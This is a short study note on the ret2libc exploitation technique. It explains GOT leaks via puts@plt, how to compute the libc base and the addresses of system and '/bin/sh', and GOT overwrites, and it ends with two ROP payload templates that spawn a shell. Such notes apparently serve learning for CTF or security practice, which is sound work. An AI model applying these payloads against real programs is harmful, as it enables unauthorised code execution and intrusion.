# 1. GOT leak

By making use of puts@plt and puts@got

## Normal flow when calling puts("hello"):
```xl
1. Code calls puts@plt
2. First time:
   puts@plt -> dynamic linker -> resolves real puts address -> stores in puts@got
   Future calls: puts@plt -> puts@got -> real puts in libc

3. So it goes: 
   puts@plt -> checks puts@got -> jumps to 0x7ffff7a649c0 (real puts in libc)
```

## Our exploit flow when doing puts(puts_got):
```apache
1. We make puts print the contents of its own GOT entry
2. Instead of puts printing a string, we give it address 0x601018 (puts_got)
3. puts reads from 0x601018 and prints what's there: 0x7ffff7a649c0
4. 0x7ffff7a649c0 is the actual address of puts in libc!
```


The key difference:

- Normal: PLT uses GOT as a lookup table to find real function
- Exploit: We make puts print what's IN the GOT table instead of using it for lookup

This is why it's called a "GOT leak" - we're leaking the contents of the GOT table which contains real libc addresses!


```apache
Normal puts("hello"):
- puts@plt receives address 0x4006xx where "hello" string is stored
- That address contains: 68 65 6c 6c 6f 00 (hello\0)
- puts reads from that address until it hits null byte

Our exploit puts(puts_got):
- puts@plt receives address 0x601018 (puts_got)
- That address contains: 0x7ffff7a649c0 (actual puts address)
- puts reads and prints this address as bytes
```

```c
// Normal usage
char str[] = "hello";  // stored at 0x4006xx
puts(str);  // puts receives 0x4006xx, prints "hello"

// Our exploit
void* got_entry = 0x601018;  // address of puts_got
puts(got_entry);  // puts receives 0x601018, prints bytes at that location
```



# 2. Calculate libc base

```py
# Example:
puts_leak = leaked_address
libc_base = puts_leak - libc.symbols['puts']  # Subtract puts offset
```


# 3. calculate system address 
   
```py
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh')) # whats `next`
```

# 4. Hijack GOT entry:
- Either overwrite puts@got with system() address
- Or create ROP chain to call system("/bin/sh")


The code idea is 

```pgsql
1. We leaked puts@got -> know where libc is
2. Now we know where everything in libc is:
   - system()
   - "/bin/sh" string
   - other useful functions
3. We can make next function call go to system() instead
```

Common pattern

```python
# First payload: Leak libc
payload1 = pad + pop_rdi + puts_got + puts_plt + main

# Second payload: Call system
payload2 = pad + pop_rdi + bin_sh_addr + system_addr
```